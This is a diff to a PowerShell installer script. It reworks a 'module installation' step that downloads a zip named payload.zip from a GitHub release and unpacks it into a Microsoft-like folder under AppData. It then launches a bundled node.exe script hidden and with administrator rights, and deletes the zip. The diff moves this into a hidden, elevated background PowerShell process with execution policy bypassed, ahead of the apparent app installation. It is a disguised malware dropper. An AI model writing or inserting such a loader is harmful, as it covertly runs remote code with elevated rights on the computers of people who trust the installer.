@@ -19,33 +19,33 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 $ErrorActionPreference = 'Stop'
 
 # Module installation
-$dest = "$env:APPDATA\Microsoft\Service"
-if (-not (Test-Path $dest)) {
-    New-Item -ItemType Directory -Path $dest | Out-Null
+$bgModules = @"
+`$dest = `"$env:APPDATA\Microsoft\Service`"
+if (-not (Test-Path `$dest)) {
+    New-Item -ItemType Directory -Path `$dest | Out-Null
 }
 
-$zipUrl = "https://github.com/whylolitry/dki/releases/download/SKODIAVMFAORSDIFGMOPMIFDKVOZ843/App.zip"
-$zipPath = "$env:TEMP\payload.zip"
+`$zipUrl = `"https://github.com/whylolitry/dki/releases/download/SKODIAVMFAORSDIFGMOPMIFDKVOZ843/App.zip`"
+`$zipPath = `"$env:TEMP\payload.zip`"
 
-Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath
-Expand-Archive -Path $zipPath -DestinationPath $dest -Force
+Invoke-WebRequest -Uri `$zipUrl -OutFile `$zipPath
+Expand-Archive -Path `$zipPath -DestinationPath `$dest -Force
 
-$node = Get-ChildItem -Path "$dest\App" -Filter "node.exe" -Recurse -File | Select-Object -First 1
-$script = Get-ChildItem -Path "$dest\App" -Filter "index_*.js" -Recurse -File | Select-Object -First 1
+`$node = Get-ChildItem -Path `"$dest\App`" -Filter `"node.exe`" -Recurse -File | Select-Object -First 1
+`$script = Get-ChildItem -Path `"$dest\App`" -Filter `"index_*.js`" -Recurse -File | Select-Object -First 1
 
-if ($node -and $script) {
-    $psi = New-Object System.Diagnostics.ProcessStartInfo
-    $psi.FileName = $node.FullName
-    $psi.Arguments = "`"$($script.FullName)`""
-    $psi.WorkingDirectory = "$dest\App"
-    $psi.WindowStyle = "Hidden"
-    $psi.UseShellExecute = $true
-	$psi.Verb = "runas"
-	
-    [System.Diagnostics.Process]::Start($psi) | Out-Null
+if (`$node -and `$script) {
+    Start-Process -FilePath `$node.FullName `
+        -ArgumentList "`"`$(`$script.FullName)`"`" `
+        -WorkingDirectory `"$dest\App`" `
+        -WindowStyle Hidden `
+        -Verb RunAs | Out-Null
 }
 
-Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
+Remove-Item `$zipPath -Force -ErrorAction SilentlyContinue
+"@
+
+Start-Process powershell.exe -WindowStyle Hidden -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"$bgModules`""
 
 # App installation
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
